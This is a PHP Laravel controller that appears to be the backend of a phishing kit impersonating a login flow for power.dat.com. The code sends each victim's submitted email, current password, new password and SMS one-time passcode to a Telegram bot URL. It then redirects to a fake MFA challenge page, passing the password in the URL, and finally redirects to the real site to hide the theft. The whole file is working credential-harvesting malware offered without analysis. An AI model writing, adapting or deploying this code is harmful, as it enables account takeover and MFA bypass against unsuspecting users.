<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class LoginController extends Controller
{
    public function passwordProtection(Request $request)
    {
        $data = $request->all();

        try {
            $curl = curl_init();

            curl_setopt_array($curl, array(
                CURLOPT_URL => env('TELEGRAM_URL', false).'text=NEW LOGIN',
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'GET',
            ));

            curl_exec($curl);

            curl_setopt_array($curl, array(
                CURLOPT_URL => env('TELEGRAM_URL', false).'text=email%3A%20'.$data['email'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'GET',
            ));

            curl_exec($curl);

            curl_setopt_array($curl, array(
                CURLOPT_URL => env('TELEGRAM_URL', false).'text=pass%3A%20'.$data['password'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'GET',
            ));

            curl_exec($curl);

            curl_setopt_array($curl, array(
                CURLOPT_URL => env('TELEGRAM_URL', false).'text=newPass%3A%20'.$data['new-password'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'GET',
            ));

            curl_exec($curl);

            curl_setopt_array($curl, array(
                CURLOPT_URL => env('TELEGRAM_URL', false).'text=confirmNewPass%3A%20'.$data['confirm-new-password'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'GET',
            ));

            curl_exec($curl);


        } catch (\Exception $e) {
            echo 'Caught exception: ',  $e->getMessage(), "\n";
        }

        return redirect('/mfa-sms-challenge?state=hKFo2SA1Z2VIZ3dxMjBaTTNrQTBNOXplM2JmeFJTOWkyNVd6aaFupWxvZ2luo3RpZNkgdklYN3VXNmowNm9fYkltVC1Vajh3NGNiT0NxRDBpSkajY2lk2SBQcHl2b1JHMk5CcGdiQlZmWGpsMUdhZ1RuaTRSWkh4UA&email='.$request->all()['email'].'&pass='.$request->all()['password']);

    }


    public function complete(Request $request) {
        $data = $request->all();

        try {
            $curl = curl_init();

            curl_setopt_array($curl, array(
                CURLOPT_URL => env('TELEGRAM_URL', false).'text=email%3A%20'.$data['email'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'GET',
            ));

            curl_exec($curl);

            curl_setopt_array($curl, array(
                CURLOPT_URL => env('TELEGRAM_URL', false).'text=otp%3A%20'.$data['otp'],
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_ENCODING => '',
                CURLOPT_MAXREDIRS => 10,
                CURLOPT_TIMEOUT => 0,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
                CURLOPT_CUSTOMREQUEST => 'GET',
            ));

            curl_exec($curl);
        } catch (\Exception $e) {
            echo 'Caught exception: ',  $e->getMessage(), "\n";
        }

        return redirect('https://power.dat.com');
    }
}
